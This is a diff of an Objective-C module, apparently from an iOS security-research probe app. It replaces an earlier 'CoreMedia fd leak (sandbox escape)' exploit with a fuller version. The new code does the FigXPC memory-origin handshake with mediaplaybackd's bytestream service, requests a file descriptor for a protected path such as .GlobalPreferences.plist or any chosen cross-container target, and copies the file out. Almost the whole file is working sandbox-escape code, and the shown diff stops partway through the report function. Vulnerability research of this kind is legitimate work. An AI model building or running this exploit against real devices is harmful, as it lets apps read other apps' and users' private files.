@@ -1,252 +1,488 @@
 #import "KPFDLeakModule.h"
-#import <UIKit/UIKit.h>
-#import "KPLog.h"
-#import <mach/mach.h>
-#import <dlfcn.h>
-#import <xpc/xpc.h>
-#import <sys/stat.h>
-#import <fcntl.h>
-#import <unistd.h>
-#include <dirent.h>
 
-// FigXPC function pointers (loaded via dlsym)
-static void *(*figXPCCreateBasicMessage)(uint32_t, void *);
-static void (*figXPCMessageSetCFURL)(void *, const char *, void *);
-static int (*figXPCMessageGetCFURL)(void *, const char *, void **);
-static void (*figXPCConnectionSetMessageHandler)(void *, void *);
-static void (*figXPCConnectionResume)(void *);
-static void *(*figXPCConnectionCreateMachService)(const char *, void *, uint64_t);
-static int (*figXPCMessageGetCFDictionary)(void *, const char *, void **);
-static void (*figXPCMessageSetCFDictionary)(void *, const char *, void *);
-static void (*figXPCMessageSetInt32)(void *, const char *, int32_t);
-static int (*figXPCMessageGetInt32)(void *, const char *, int32_t *);
-static int (*figXPCConnectionSendSyncMessage)(void *, void *, void **);
+#import <CommonCrypto/CommonDigest.h>
+#import <dlfcn.h>
+#import <errno.h>
+#import <fcntl.h>
+#import <stdint.h>
+#import <stdlib.h>
+#import <string.h>
+#import <sys/stat.h>
+#import <unistd.h>
+
+#define KP_BS_MAX_FILE_SIZE (16 * 1024 * 1024)
+#define KP_BS_REPLY_TIMEOUT 8
+
+#if __has_include(<xpc/xpc.h>)
+#import <xpc/xpc.h>
+#define KP_BS_HAS_XPC_HEADERS 1
+#else
+#define KP_BS_HAS_XPC_HEADERS 0
+typedef void *xpc_object_t;
+typedef void *xpc_type_t;
+typedef xpc_object_t xpc_connection_t;
+extern xpc_connection_t xpc_connection_create_mach_service(const char *name, dispatch_queue_t targetQueue, uint64_t flags);
+extern void xpc_connection_set_event_handler(xpc_connection_t connection, void (^handler)(xpc_object_t event));
+extern void xpc_connection_resume(xpc_connection_t connection);
+extern void xpc_connection_cancel(xpc_connection_t connection);
+extern void xpc_connection_send_message_with_reply(xpc_connection_t connection, xpc_object_t message, dispatch_queue_t replyQueue, void (^handler)(xpc_object_t reply));
+extern xpc_object_t xpc_dictionary_get_value(xpc_object_t dictionary, const char *key);
+extern uint64_t xpc_dictionary_get_uint64(xpc_object_t dictionary, const char *key);
+extern void xpc_dictionary_set_uint64(xpc_object_t dictionary, const char *key, uint64_t value);
+extern int xpc_dictionary_dup_fd(xpc_object_t dictionary, const char *key);
+extern xpc_type_t xpc_get_type(xpc_object_t object);
+extern const char *xpc_type_get_name(xpc_type_t type);
+extern char *xpc_copy_description(xpc_object_t object);
+extern xpc_object_t xpc_retain(xpc_object_t object);
+extern void xpc_release(xpc_object_t object);
+#endif
+
+#if KP_BS_HAS_XPC_HEADERS && OS_OBJECT_USE_OBJC
+#define KP_BS_XPC_ARC 1
+static xpc_object_t KPBSRetain(xpc_object_t object) {
+    return object;
+}
+static void KPBSRelease(xpc_object_t object) {
+    (void)object;
+}
+#undef xpc_retain
+#define xpc_retain(object) KPBSRetain(object)
+#undef xpc_release
+#define xpc_release(object) KPBSRelease(object)
+#else
+#define KP_BS_XPC_ARC 0
+#endif
+
+typedef int32_t (*KPBSBasicMessage)(uint32_t operation, uint64_t argument, xpc_object_t *message);
+typedef int32_t (*KPBSOriginBegin)(xpc_object_t message);
+typedef int32_t (*KPBSOriginComplete)(xpc_object_t reply, CFTypeRef *origin);
+typedef int32_t (*KPBSRecipientCreate)(xpc_object_t rp1Reply, xpc_object_t rp2Message, const char *name, CFTypeRef *recipient);
+typedef int32_t (*KPBSMessageSetURL)(xpc_object_t message, const char *key, CFURLRef URL);
+typedef xpc_connection_t (*KPBSConnectionCreate)(const char *name, dispatch_queue_t targetQueue, uint64_t flags);
+
+typedef struct {
+    KPBSBasicMessage basic;
+    KPBSOriginBegin originBegin;
+    KPBSOriginComplete originComplete;
+    KPBSRecipientCreate recipientCreate;
+    KPBSMessageSetURL setURL;
+    KPBSConnectionCreate connectionCreate;
+    BOOL ready;
+    NSString *error;
+} KPBSFigAPI;
+
+static KPBSFigAPI gBSAPI;
+
+static void KPBSResolveAPI(void) {
+    static dispatch_once_t onceToken;
+    dispatch_once(&onceToken, ^{
+        void *handle = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia", RTLD_NOW | RTLD_LOCAL);
+        if (!handle) {
+            gBSAPI.error = [NSString stringWithUTF8String:dlerror() ?: "dlopen(CoreMedia) failed"];
+            return;
+        }
+        gBSAPI.basic = (KPBSBasicMessage)dlsym(handle, "FigXPCCreateBasicMessage");
+        gBSAPI.originBegin = (KPBSOriginBegin)dlsym(handle, "FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1");
+        gBSAPI.originComplete = (KPBSOriginComplete)dlsym(handle, "FigMemoryOriginCompleteEstablishingMemoryRecipientUsingXPCMessage2");
+        gBSAPI.recipientCreate = (KPBSRecipientCreate)dlsym(handle, "FigMemoryRecipientCreateWithXPCMessage1AndUpdateXPCMessage2");
+        gBSAPI.setURL = (KPBSMessageSetURL)dlsym(handle, "FigXPCMessageSetCFURL");
+        gBSAPI.connectionCreate = (KPBSConnectionCreate)dlsym(RTLD_DEFAULT, "xpc_connection_create_mach_service");
+        if (!gBSAPI.basic || !gBSAPI.originBegin || !gBSAPI.originComplete || !gBSAPI.recipientCreate || !gBSAPI.setURL || !gBSAPI.connectionCreate) {
+            gBSAPI.error = [NSString stringWithFormat:@"missing symbols basic=%p begin=%p complete=%p recipient=%p setURL=%p connectionCreate=%p",
+                            gBSAPI.basic, gBSAPI.originBegin, gBSAPI.originComplete, gBSAPI.recipientCreate, gBSAPI.setURL, gBSAPI.connectionCreate];
+            return;
+        }
+        gBSAPI.ready = YES;
+    });
+}
+
+static NSString *KPBSTypeName(xpc_object_t object) {
+    if (!object) return @"nil";
+    xpc_type_t type = xpc_get_type(object);
+    const char *name = type ? xpc_type_get_name(type) : NULL;
+    return name ? [NSString stringWithUTF8String:name] : @"unknown";
+}
+
+static NSString *KPBSDescription(xpc_object_t object) {
+    if (!object) return @"nil";
+    char *description = xpc_copy_description(object);
+    if (!description) return @"<no description>";
+    NSString *result = [NSString stringWithUTF8String:description] ?: @"<non-UTF8 description>";
+    free(description);
+    return result;
+}
+
+static BOOL KPBSTypeIsDictionary(NSString *type) {
+    return [type isEqualToString:@"dictionary"];
+}
+
+static NSString *KPBSHexPrefix(NSData *data, NSUInteger limit) {
+    const uint8_t *bytes = data.bytes;
+    NSUInteger count = MIN(data.length, limit);
+    NSMutableString *result = [NSMutableString stringWithCapacity:count * 2 + 3];
+    for (NSUInteger index = 0; index < count; index++) [result appendFormat:@"%02x", bytes[index]];
+    if (data.length > count) [result appendString:@"…"];
+    return result;
+}
+
+static NSString *KPBSSHA256(NSData *data) {
+    uint8_t digest[CC_SHA256_DIGEST_LENGTH];
+    CC_SHA256(data.bytes, (CC_LONG)data.length, digest);
+    NSMutableString *result = [NSMutableString stringWithCapacity:CC_SHA256_DIGEST_LENGTH * 2];
+    for (NSUInteger index = 0; index < sizeof(digest); index++) [result appendFormat:@"%02x", digest[index]];
+    return result;
+}
+
+@interface KPByteStreamSession : NSObject
+@property (nonatomic, assign) int journalFD;
+@property (nonatomic, strong) NSMutableString *report;
+#if KP_BS_XPC_ARC
+@property (nonatomic, strong) xpc_connection_t connection;
+#else
+@property (nonatomic, assign) xpc_connection_t connection;
+#endif
+@property (nonatomic, assign) CFTypeRef memoryRecipient;
+@property (nonatomic, assign) CFTypeRef memoryOrigin;
+@property (nonatomic, assign) BOOL handshakeReady;
+- (void)log:(NSString *)format, ... NS_FORMAT_FUNCTION(1, 2);
+- (xpc_object_t)send:(xpc_object_t)message type:(NSString **)type;
+- (BOOL)performHandshake;
+- (BOOL)readTarget:(NSString *)path output:(NSURL *)outputURL;
+@end
+
+@implementation KPByteStreamSession
+
+- (void)log:(NSString *)format, ... {
+    va_list arguments;
+    va_start(arguments, format);
+    NSString *line = [[NSString alloc] initWithFormat:format arguments:arguments];
+    va_end(arguments);
+    @synchronized (self) {
+        [self.report appendFormat:@"%@\n", line];
+        if (self.journalFD >= 0) {
+            NSData *data = [[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding];
+            const uint8_t *position = data.bytes;
+            size_t remaining = data.length;
+            while (remaining) {
+                ssize_t written = write(self.journalFD, position, remaining);
+                if (written < 0) {
+                    if (errno == EINTR) continue;
+                    break;
+                }
+                if (!written) break;
+                position += written;
+                remaining -= (size_t)written;
+            }
+            fsync(self.journalFD);
+        }
+    }
+}
+
+- (void)logReply:(NSString *)label reply:(xpc_object_t)reply type:(NSString *)type {
+    [self log:@"%@ type=%@ description=%@", label, type, KPBSDescription(reply)];
+}
+
+- (xpc_object_t)send:(xpc_object_t)message type:(NSString **)type {
+    if (!message || !self.connection) {
+        if (type) *type = @"invalid-call";
+        return NULL;
+    }
+    dispatch_semaphore_t semaphore = dispatch_semaphore_create(0);
+    __block xpc_object_t reply = NULL;
+    __block NSString *replyType = @"nil";
+    xpc_connection_send_message_with_reply(self.connection, message, NULL, ^(xpc_object_t object) {
+        replyType = KPBSTypeName(object);
+        if ([replyType isEqualToString:@"dictionary"] || [replyType isEqualToString:@"error"]) {
+            reply = xpc_retain(object);
+        }
+        dispatch_semaphore_signal(semaphore);
+    });
+    if (dispatch_semaphore_wait(semaphore, dispatch_time(DISPATCH_TIME_NOW, (int64_t)KP_BS_REPLY_TIMEOUT * NSEC_PER_SEC)) != 0) {
+        if (type) *type = @"timeout-8s";
+        return NULL;
+    }
+    if (type) *type = replyType;
+    return reply;
+}
+
+- (BOOL)performHandshake {
+    xpc_object_t rp1 = NULL;
+    xpc_object_t rp2 = NULL;
+    xpc_object_t originMessage = NULL;
+    xpc_object_t rp1Reply = NULL;
+    xpc_object_t rp2Reply = NULL;
+    xpc_object_t originReply = NULL;
+    @try {
+        int32_t status = gBSAPI.basic(0x2e727031, 0, &rp1);
+        [self log:@"RP1_CREATE status=%d message=%p", status, rp1];
+        if (status != 0 || !rp1) return NO;
+        NSString *type = nil;
+        rp1Reply = [self send:rp1 type:&type];
+        [self logReply:@"RP1_REPLY" reply:rp1Reply type:type];
+        if (!rp1Reply || !KPBSTypeIsDictionary(type)) return NO;
+
+        status = gBSAPI.basic(0x2e727032, 0, &rp2);
+        [self log:@"RP2_CREATE status=%d message=%p", status, rp2];
+        if (status != 0 || !rp2) return NO;
+        status = gBSAPI.recipientCreate(rp1Reply, rp2, "mconf", &_memoryRecipient);
+        [self log:@"RECIPIENT_CREATE status=%d recipient=%p", status, _memoryRecipient];
+        if (status != 0 || !_memoryRecipient) return NO;
+        type = nil;
+        rp2Reply = [self send:rp2 type:&type];
+        [self logReply:@"RP2_REPLY" reply:rp2Reply type:type];
+        if (!rp2Reply || !KPBSTypeIsDictionary(type)) return NO;
+
+        status = gBSAPI.basic(0x2e6f7267, 0, &originMessage);
+        [self log:@"ORG_CREATE status=%d message=%p", status, originMessage];
+        if (status != 0 || !originMessage) return NO;
+        status = gBSAPI.originBegin(originMessage);
+        [self log:@"ORG_BEGIN status=%d", status];
+        if (status != 0) return NO;
+        type = nil;
+        originReply = [self send:originMessage type:&type];
+        [self logReply:@"ORG_REPLY" reply:originReply type:type];
+        if (!originReply || !KPBSTypeIsDictionary(type)) return NO;
+        status = gBSAPI.originComplete(originReply, &_memoryOrigin);
+        self.handshakeReady = status == 0 && _memoryOrigin != NULL;
+        [self log:@"ORG_COMPLETE status=%d origin=%p ready=%d", status, _memoryOrigin, self.handshakeReady];
+        return self.handshakeReady;
+    } @finally {
+        if (originReply) xpc_release(originReply);
+        if (rp2Reply) xpc_release(rp2Reply);
+        if (rp1Reply) xpc_release(rp1Reply);
+        if (originMessage) xpc_release(originMessage);
+        if (rp2) xpc_release(rp2);
+        if (rp1) xpc_release(rp1);
+    }
+}
+
+- (void)closeStream:(uint64_t)objectID {
+    xpc_object_t message = NULL;
+    xpc_object_t reply = NULL;
+    @try {
+        int32_t status = gBSAPI.basic(0x646f6f6d, objectID, &message);
+        [self log:@"DOOM_CREATE status=%d ObjectID=0x%llx message=%p", status, objectID, message];
+        if (status != 0 || !message) return;
+        NSString *type = nil;
+        reply = [self send:message type:&type];
+        [self logReply:@"DOOM_REPLY" reply:reply type:type];
+    } @finally {
+        if (reply) xpc_release(reply);
+        if (message) xpc_release(message);
+    }
+}
+
+- (NSData *)readDescriptor:(int)fd {
+    struct stat info;
+    if (fstat(fd, &info) != 0) {
+        [self log:@"FD_FSTAT errno=%d (%s)", errno, strerror(errno)];
+        return nil;
+    }
+    [self log:@"FD_STAT mode=0%o size=%lld", info.st_mode, (long long)info.st_size];
+    if (!S_ISREG(info.st_mode)) {
+        [self log:@"FD_READ rejected non-regular file"];
+        return nil;
+    }
+    if (info.st_size < 0 || info.st_size > KP_BS_MAX_FILE_SIZE) {
+        [self log:@"FD_READ rejected size=%lld cap=%d", (long long)info.st_size, KP_BS_MAX_FILE_SIZE];
+        return nil;
+    }
+    NSMutableData *data = [NSMutableData dataWithCapacity:(NSUInteger)info.st_size];
+    uint8_t buffer[16384];
+    off_t offset = 0;
+    while (offset < info.st_size) {
+        size_t wanted = MIN((size_t)(info.st_size - offset), sizeof(buffer));
+        ssize_t count = pread(fd, buffer, wanted, offset);
+        if (count < 0) {
+            if (errno == EINTR) continue;
+            [self log:@"FD_PREAD offset=%lld errno=%d (%s)", (long long)offset, errno, strerror(errno)];
+            return nil;
+        }
+        if (!count) break;
+        [data appendBytes:buffer length:(NSUInteger)count];
+        offset += count;
+    }
+    [self log:@"FD_READ bytes=%llu expected=%lld sha256=%@", (unsigned long long)data.length,
+     (long long)info.st_size, KPBSSHA256(data)];
+    [self log:@"FD_FIRST_BYTES count=%lu hex=%@", (unsigned long)MIN(data.length, (NSUInteger)64), KPBSHexPrefix(data, 64)];
+    return data;
+}
+
+- (BOOL)readTarget:(NSString *)path output:(NSURL *)outputURL {
+    errno = 0;
+    int directFD = open(path.fileSystemRepresentation, O_RDONLY | O_CLOEXEC);
+    int directError = errno;
+    if (directFD >= 0) {
+        [self log:@"DIRECT_OPEN allowed path=%@ fd=%d", path, directFD];
+        close(directFD);
+    } else {
+        [self log:@"DIRECT_OPEN denied path=%@ errno=%d (%s)", path, directError, strerror(directError)];
+    }
+
+    xpc_object_t message = NULL;
+    xpc_object_t reply = NULL;
+    uint64_t objectID = 0;
+    int fd = -1;
+    @try {
+        int32_t status = gBSAPI.basic(0x4375726c, 0, &message);
+        [self log:@"CURL_CREATE status=%d message=%p", status, message];
+        if (status != 0 || !message) return NO;
+        NSURL *URL = [NSURL fileURLWithPath:path];
+        status = gBSAPI.setURL(message, "CreationURL", (__bridge CFURLRef)URL);
+        [self log:@"CURL_SET_URL status=%d path=%@", status, path];
+        if (status != 0) return NO;
+        xpc_dictionary_set_uint64(message, "FileOpenOptions", 0);
+        NSString *type = nil;
+        reply = [self send:message type:&type];
+        [self logReply:@"CURL_REPLY" reply:reply type:type];
+        if (!reply || !KPBSTypeIsDictionary(type)) return NO;
+        xpc_object_t details = xpc_dictionary_get_value(reply, "ByteStreamDetails");
+        [self log:@"CURL_DETAILS present=%d description=%@", details != NULL, KPBSDescription(details)];
+        if (!details) return NO;
+        objectID = xpc_dictionary_get_uint64(details, "ObjectID");
+        errno = 0;
+        fd = xpc_dictionary_dup_fd(details, "FileDescriptor");
+        int dupError = errno;
+        [self log:@"CURL_FD ObjectID=0x%llx dup_fd=%d errno=%d (%s)", objectID, fd, dupError, strerror(dupError)];
+        if (fd < 0) return NO;
+        NSData *data = [self readDescriptor:fd];
+        close(fd);
+        fd = -1;
+        if (!data) return NO;
+        NSError *error = nil;
+        if (![data writeToURL:outputURL options:NSDataWritingAtomic error:&error]) {
+            [self log:@"SAVE_FAILED path=%@ error=%@", outputURL.path, error.localizedDescription];
+            return NO;
+        }
+        [self log:@"SAVE_OK path=%@ bytes=%llu", outputURL.path, (unsigned long long)data.length];
+        return YES;
+    } @finally {
+        if (fd >= 0) close(fd);
+        if (objectID) [self closeStream:objectID];
+        if (reply) xpc_release(reply);
+        if (message) xpc_release(message);
+    }
+}
+
+@end
 
 @interface KPFDLeakModule ()
-@property (nonatomic, copy) NSString *identifier;
-@property (nonatomic, copy) NSString *title;
-@property (nonatomic, copy) NSString *subtitle;
-@property (nonatomic, copy) NSString *icon;
-@property (nonatomic, assign) KPTestSection section;
+@property (nonatomic, assign, readwrite) BOOL armed;
+@property (nonatomic, copy, readwrite) NSString *identifier;
+@property (nonatomic, copy, readwrite) NSString *title;
+@property (nonatomic, copy, readwrite) NSString *subtitle;
+@property (nonatomic, copy, readwrite) NSString *icon;
+@property (nonatomic, assign, readwrite) KPTestSection section;
+@property (nonatomic, copy) NSString *targetPath;
+@property (nonatomic, copy) NSString *sessionName;
 @end
 
 @implementation KPFDLeakModule
 
-- (instancetype)initWithNameSweep {
+- (instancetype)initWithArmed:(BOOL)armed {
     self = [super init];
     if (self) {
-        _identifier = @"fdleak112706";
-        _title = @"CoreMedia fd leak (sandbox escape)";
-        _subtitle = @"CVE-2026-112706: mediaplaybackd vends fds for protected paths";
-        _icon = @"lock.open";
+        _armed = armed;
+        _identifier = armed ? @"bytestream27.global-preferences" : @"bytestream27.baseline";
+        _title = armed ? @"ByteStream Protected File Read" : @"ByteStream Baseline";
+        _subtitle = armed
+            ? @"Explicit tap · mediaplaybackd Curl · .GlobalPreferences.plist"
+            : @"Memory-origin handshake · /etc/hosts · direct-open control";
+        _icon = armed ? @"doc.text.magnifyingglass" : @"network";
+        _section = KPTestSectionKernelProbes;
+        _targetPath = armed
+            ? @"/private/var/mobile/Library/Preferences/.GlobalPreferences.plist"
+            : @"/etc/hosts";
+        _sessionName = armed ? @"armed" : @"baseline";
+    }
+    return self;
+}
+
+- (instancetype)initWithTargetPath:(NSString *)targetPath sessionName:(NSString *)sessionName {
+    self = [super init];
+    if (self) {
+        _armed = YES;
+        _targetPath = [targetPath copy];
+        _sessionName = [sessionName copy];
+        _identifier = [@"bytestream27." stringByAppendingString:sessionName];
+        _title = [NSString stringWithFormat:@"ByteStream Read %@", targetPath.lastPathComponent];
+        _subtitle = @"Explicit tap · read-only Curl · cross-container target";
+        _icon = @"doc.text.magnifyingglass";
         _section = KPTestSectionKernelProbes;
     }
     return self;
 }
 
-- (void)journal:(NSString *)line {
-    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
-                      stringByAppendingPathComponent:@"kp-fdleak-journal.log"];
-    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
-    if (!fh) {
-        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
-        fh = [NSFileHandle fileHandleForWritingAtPath:path];
-    }
-    [fh seekToEndOfFile];
-    [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
-    [fh synchronizeFile];
-    [fh closeFile];
-    [KPLog.shared appendFormat:@"[fdleak] %@", line];
-}
-
-- (BOOL)loadFigXPC {
-    void *h = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia", RTLD_LAZY);
-    if (!h) {
-        [self journal:@"dlopen CoreMedia failed"];
-        return NO;
-    }
-
-    // FigXPC functions from CoreMedia
-    figXPCCreateBasicMessage = dlsym(h, "FigXPCCreateBasicMessage");
-    figXPCMessageSetCFURL = dlsym(h, "FigXPCMessageSetCFURL");
-    figXPCMessageGetCFDictionary = dlsym(h, "FigXPCMessageGetCFDictionary");
-
-    // FigMemoryOrigin handshake functions
-    static void *(*figMemOriginBegin)(void *, void *);
-    static int (*figMemOriginComplete)(void *, void *);
-    static void *(*figMemRecipientCreate)(void *, void *);
-    figMemOriginBegin = dlsym(h, "FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1");
-    figMemOriginComplete = dlsym(h, "FigMemoryOriginCompleteEstablishingMemoryRecipientUsingXPCMessage2");
-    figMemRecipientCreate = dlsym(h, "FigMemoryRecipientCreateWithXPCMessage1AndUpdateXPCMessage2");
-
-    [self journal:[NSString stringWithFormat:@"FigXPCCreateBasicMessage: %p", figXPCCreateBasicMessage]];
-    [self journal:[NSString stringWithFormat:@"FigXPCMessageSetCFURL: %p", figXPCMessageSetCFURL]];
-    [self journal:[NSString stringWithFormat:@"FigMemoryOrigin*: %p %p %p", figMemOriginBegin, figMemOriginComplete, figMemRecipientCreate]];
-
-    if (!figXPCCreateBasicMessage) {
-        [self journal:@"FigXPCCreateBasicMessage not found"];
-        return NO;
-    }
-
-    [self journal:@"FigXPC functions loaded"];
-    return YES;
-}
-
-- (int)stealFD:(NSString *)filePath {
-    // Load XPC functions via dlsym (not available on iOS at compile time)
-    static xpc_connection_t (*my_xpc_conn_create)(const char *, void *, uint64_t) = NULL;
-    static void (*my_xpc_conn_set_handler)(xpc_connection_t, void *) = NULL;
-    static void (*my_xpc_conn_resume)(xpc_connection_t) = NULL;
-    static void (*my_xpc_conn_cancel)(xpc_connection_t) = NULL;
-    static void (*my_xpc_conn_send_reply)(xpc_connection_t, xpc_object_t, void *, void *) = NULL;
-    static int (*my_xpc_dict_dup_fd)(xpc_object_t, const char *) = NULL;
-    static xpc_object_t (*my_xpc_dict_get_value)(xpc_object_t, const char *) = NULL;
-
-    if (!my_xpc_conn_create) {
-        void *xpcLib = dlopen("/usr/lib/system/libxpc.dylib", RTLD_LAZY);
-        if (!xpcLib) xpcLib = dlopen("/usr/lib/libxpc.dylib", RTLD_LAZY);
-        my_xpc_conn_create = dlsym(xpcLib ? xpcLib : RTLD_DEFAULT, "xpc_connection_create_mach_service");
-        my_xpc_conn_set_handler = dlsym(xpcLib ? xpcLib : RTLD_DEFAULT, "xpc_connection_set_event_handler");
-        my_xpc_conn_resume = dlsym(xpcLib ? xpcLib : RTLD_DEFAULT, "xpc_connection_resume");
-        my_xpc_conn_cancel = dlsym(xpcLib ? xpcLib : RTLD_DEFAULT, "xpc_connection_cancel");
-        my_xpc_conn_send_reply = dlsym(xpcLib ? xpcLib : RTLD_DEFAULT, "xpc_connection_send_message_with_reply");
-        my_xpc_dict_dup_fd = dlsym(xpcLib ? xpcLib : RTLD_DEFAULT, "xpc_dictionary_dup_fd");
-        my_xpc_dict_get_value = dlsym(xpcLib ? xpcLib : RTLD_DEFAULT, "xpc_dictionary_get_value");
-        [self journal:[NSString stringWithFormat:@"xpc funcs: %p %p %p", my_xpc_conn_create, my_xpc_conn_send_reply, my_xpc_dict_dup_fd]];
-    }
-
-    if (!my_xpc_conn_create || !my_xpc_conn_send_reply || !my_xpc_dict_dup_fd) {
-        [self journal:@"XPC functions not available"];
-        return -1;
-    }
-
-    xpc_connection_t conn = my_xpc_conn_create("com.apple.coremedia.mediaplaybackd.bytestream.xpc", NULL, 0);
-    if (!conn) {
-        [self journal:@"XPC connection failed"];
-        return -1;
-    }
-    [self journal:@"XPC connection created"];
-    my_xpc_conn_resume(conn);
-
-    // Handshake
-    for (NSString *opStr in @[@".rp1", @".rp2", @".org"]) {
-        uint32_t opcode = 0;
-        memcpy(&opcode, opStr.UTF8String, 4);
-        void *msg = figXPCCreateBasicMessage(opcode, NULL);
-        if (!msg) { [self journal:[NSString stringWithFormat:@"create %@ failed", opStr]]; continue; }
-        __block xpc_object_t reply = NULL;
-        my_xpc_conn_send_reply(conn, (__bridge xpc_object_t)msg, NULL, (__bridge void *)^(xpc_object_t r) { reply = r; });
-        usleep(100000);
-        [self journal:[NSString stringWithFormat:@"handshake %@: reply=%p", opStr, reply]];
-    }
-
-    // Curl create
-    uint32_t curlOp = 'Curl';
-    void *curlMsg = figXPCCreateBasicMessage(curlOp, NULL);
-    if (!curlMsg) { [self journal:@"Curl msg failed"]; my_xpc_conn_cancel(conn); return -1; }
-
-    NSString *urlStr = [NSString stringWithFormat:@"file://%@", filePath];
-    CFURLRef url = CFURLCreateWithString(NULL, (__bridge CFStringRef)urlStr, NULL);
-    figXPCMessageSetCFURL(curlMsg, "CreationURL", url);
-    CFRelease(url);
-    [self journal:[NSString stringWithFormat:@"Curl: %@", urlStr]];
-
-    __block xpc_object_t curlReply = NULL;
-    my_xpc_conn_send_reply(conn, (__bridge xpc_object_t)curlMsg, NULL, (__bridge void *)^(xpc_object_t r) { curlReply = r; });
-    usleep(200000);
-
-    if (!curlReply) {
-        [self journal:@"Curl reply NULL"];
-        my_xpc_conn_cancel(conn);
-        return -1;
-    }
-
-    // Extract fd
-    xpc_object_t details = my_xpc_dict_get_value(curlReply, "ByteStreamDetails");
-    int fd = -1;
-    if (details) {
-        fd = my_xpc_dict_dup_fd(details, "FileDescriptor");
-    } else {
-        fd = my_xpc_dict_dup_fd(curlReply, "FileDescriptor");
-    }
-    [self journal:[NSString stringWithFormat:@"GOT FD: %d", fd]];
-    my_xpc_conn_cancel(conn);
-    return fd;
-}
 - (NSString *)runReport {
-    NSMutableString *report = [NSMutableString string];
-    [report appendString:@"=== FD Leak Recon (CVE-2026-112706) ===\n"];
-    [report appendString:@"Phase 1: XPC + FigXPC availability check\n"];
-    [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];
-
-    // Test 1: FigXPC function loading
-    [report appendString:@"\n--- FigXPC symbols ---\n"];
-    void *cm = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia", RTLD_LAZY);
-    if (!cm) {
-        [report appendString:@"CoreMedia: dlopen FAILED\n"];
-    } else {
-        [report appendString:@"CoreMedia: dlopen OK\n"];
-        void *fn1 = dlsym(cm, "FigXPCCreateBasicMessage");
-        void *fn2 = dlsym(cm, "FigXPCMessageSetCFURL");
-        void *fn3 = dlsym(cm, "FigXPCConnectionCreateMachService");
-        void *fn4 = dlsym(cm, "FigXPCConnectionSendSyncMessage");
-        void *fn5 = dlsym(cm, "FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1");
-        [report appendFormat:@"  FigXPCCreateBasicMessage: %p\n", fn1];
-        [report appendFormat:@"  FigXPCMessageSetCFURL: %p\n", fn2];
-        [report appendFormat:@"  FigXPCConnectionCreateMachService: %p\n", fn3];
-        [report appendFormat:@"  FigXPCConnectionSendSyncMessage: %p\n", fn4];
-        [report appendFormat:@"  FigMemoryOrigin*: %p\n", fn5];
+    KPBSResolveAPI();
+    NSString *targetPath = self.targetPath;
+    NSString *mode = self.sessionName;
+    NSString *documents = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
+    NSString *journalPath = [documents stringByAppendingPathComponent:
+                             [NSString stringWithFormat:@"kexproofv3-bytestream-%@-journal.log", mode]];
+    NSString *outputName = [mode isEqualToString:@"armed"]
+        ? @"bytestream-armed-GlobalPreferences.plist"
+        : [mode isEqualToString:@"baseline"]
+            ? @"bytestream-baseline-hosts"
+            : [@"bytestream-" stringByAppendingString:targetPath.lastPathComponent];
+    NSURL *outputURL = [NSURL fileURLWithPath:[documents stringByAppendingPathComponent:outputName]];
+    NSMutableString *initialReport = [NSMutableString string];
+    NSError *directoryError = nil;
+    if (![[NSFileManager defaultManager] createDirectoryAtPath:documents withIntermediateDirectories:YES attributes:nil error:&directoryError]) {
+        return [NSString stringWithFormat:@"ByteStream journal setup failed: %@\n", directoryError.localizedDescription];
+    }
+    int journalFD = open(journalPath.fileSystemRepresentation, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
+    if (journalFD < 0) {
+        return [NSString stringWithFormat:@"ByteStream journal open failed: errno=%d (%s)\n", errno, strerror(errno)];
     }
 
-    // Test 2: XPC function loading
-    [report appendString:@"\n--- XPC symbols ---\n"];
-    void *xpcLib = dlopen("/usr/lib/system/libxpc.dylib", RTLD_LAZY);
-    if (!xpcLib) xpcLib = dlopen("/usr/lib/libxpc.dylib", RTLD_LAZY);
-    if (!xpcLib) {
-        [report appendString:@"libxpc: dlopen FAILED\n"];
-    } else {
-        [report appendString:@"libxpc: dlopen OK\n"];
-        void *xf1 = dlsym(xpcLib, "xpc_connection_create_mach_service");
-        void *xf2 = dlsym(xpcLib, "xpc_connection_send_message_with_reply");
-        void *xf3 = dlsym(xpcLib, "xpc_dictionary_dup_fd");
-        void *xf4 = dlsym(xpcLib, "xpc_connection_set_event_handler");
-        void *xf5 = dlsym(xpcLib, "xpc_connection_resume");
-        [report appendFormat:@"  xpc_connection_create_mach_service: %p\n", xf1];
-        [report appendFormat:@"  xpc_connection_send_message_with_reply: %p\n", xf2];
-        [report appendFormat:@"  xpc_dictionary_dup_fd: %p\n", xf3];
-        [report appendFormat:@"  xpc_connection_set_event_handler: %p\n", xf4];
-        [report appendFormat:@"  xpc_connection_resume: %p\n", xf5];
-    }
-
-    // Test 3: XPC connection attempt (minimal)
-    [report appendString:@"\n--- XPC connection test ---\n"];
-    if (xpcLib) {
-        typedef void* (*xpc_create_t)(const char *, void *, uint64_t);
-        typedef void (*xpc_fn_t)(void *);
-        xpc_create_t xpc_create = dlsym(xpcLib, "xpc_connection_create_mach_service");
-        xpc_fn_t xpc_resume = dlsym(xpcLib, "xpc_connection_resume");
-        xpc_fn_t xpc_cancel = dlsym(xpcLib, "xpc_connection_cancel");
-
-        if (xpc_create) {
-            void *conn = xpc_create("com.apple.coremedia.mediaplaybackd.bytestream.xpc", NULL, 0);
-            if (conn) {
-                [report appendString:@"connection: CREATED\n"];
-                if (xpc_resume) xpc_resume(conn);
-                [report appendString:@"connection: RESUMED\n"];
-                usleep(100000);
-                if (xpc_cancel) xpc_cancel(conn);
-                [report appendString:@"connection: CANCELLED (clean)\n"];
-            } else {
-                [report appendString:@"connection: FAILED (NULL)\n"];
-            }
+    KPByteStreamSession *session = [[KPByteStreamSession alloc] init];
+    session.journalFD = journalFD;
+    session.report = initialReport;
+    BOOL handshake = NO;
